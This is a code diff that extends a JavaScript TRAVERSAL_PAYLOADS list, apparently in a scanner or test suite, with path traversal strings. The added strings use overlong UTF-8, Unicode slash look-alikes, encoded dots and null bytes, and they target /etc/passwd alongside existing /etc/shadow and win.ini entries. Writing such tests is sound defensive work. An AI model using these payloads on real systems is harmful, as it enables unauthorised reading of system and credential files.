@@ -10,6 +10,16 @@ const TRAVERSAL_PAYLOADS = [
   "../../../etc/shadow",
   "..%252f..%252f..%252fetc%252fpasswd",
   "../../../windows/win.ini",
+  // Unicode/UTF-8 overlong encoding variants
+  "..%c0%af..%c0%af..%c0%afetc/passwd",        // UTF-8 overlong /
+  "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd", // Fullwidth solidus ／
+  "..%c1%9c..%c1%9c..%c1%9cetc/passwd",         // UTF-8 overlong \
+  "..%u2216..%u2216..%u2216etc/passwd",          // Unicode set minus ∖
+  "..%u2215..%u2215..%u2215etc/passwd",          // Unicode division slash ∕
+  // Dot segment variations
+  ".%2e/.%2e/.%2e/etc/passwd",
+  "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+  "..%00/..%00/..%00/etc/passwd",                // Null byte in path segment
 ];
 
 const TRAVERSAL_INDICATORS = [
